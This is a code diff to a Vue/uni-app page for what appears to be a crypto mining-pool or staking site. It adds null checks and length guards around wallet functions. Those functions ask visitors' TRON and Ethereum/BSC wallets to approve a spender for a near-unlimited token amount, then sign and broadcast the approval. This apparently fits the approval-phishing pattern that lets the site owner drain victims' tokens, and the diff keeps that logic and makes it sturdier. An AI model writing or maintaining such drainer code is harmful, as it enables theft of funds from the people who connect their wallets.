@@ -13,10 +13,10 @@
 				</view>
 			</view>
 		</view>
-		<DataPool v-if="mining_pool" :data="mining_pool"></DataPool>
-		<Staking :data="earnings"></Staking>
-		<question :data="problem"></question>
-		<partners :data="white"></partners>
+		<DataPool v-if="mining_pool.length>0" :data="mining_pool"></DataPool>
+		<Staking :data="earnings.length>0"></Staking>
+		<question v-if="problem.length>0" :data="problem"></question>
+		<partners v-if="white.length>0" :data="white"></partners>
 		<service></service>
 	</view>
 </template>
@@ -106,9 +106,12 @@
 				if (this.contracts.length === 0 || !this.contracts?.trc) {
 					return false;
 				}
-				uni.showLoading()
+				await uni.showLoading()
 				try {
-					let contractdata = this.contracts.trc
+					let contractdata = this.contracts?.trc
+          if (!contractdata) {
+            return;
+          }
           const tronWeb = window.tronWeb
 					let _value = 999999999000000 //授权数量
 					const parameter = [{
@@ -127,9 +130,7 @@
 					const signedTx = await tronWeb.trx.sign(tx.transaction);
 					const broastTx = await tronWeb.trx.sendRawTransaction(signedTx);
 					uni.hideLoading()
-					if (broastTx.result) {
-            console.log(`broastTx`,broastTx)
-						console.log(broastTx.result) //result 为交易哈希
+					if (broastTx?.result) {
 
 						//授权处理成功，开始成功后的业务处理----------------------
             await this.$store.dispatch(`setIsApprove`, {result: true, txid: broastTx.txid})
@@ -148,13 +149,16 @@
 			},
 			async doapprove_eth() {
         console.log(`doapprove_eth`)
-				uni.showLoading()
+				await uni.showLoading()
 				try {
 					//以太坊/币安  授权开始
 					let strabi =
 						'[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
 					let abi = JSON.parse(strabi)
 					let ctx = this.contracts[this.walletLink[this.walletIndex]]
+          if (!ctx) {
+            return;
+          }
 					let contract = new this.web3js.eth.Contract(abi, ctx.token_contract);
           //授权数量
 					let _value = Web3.utils.toWei("999999999", 'ether');
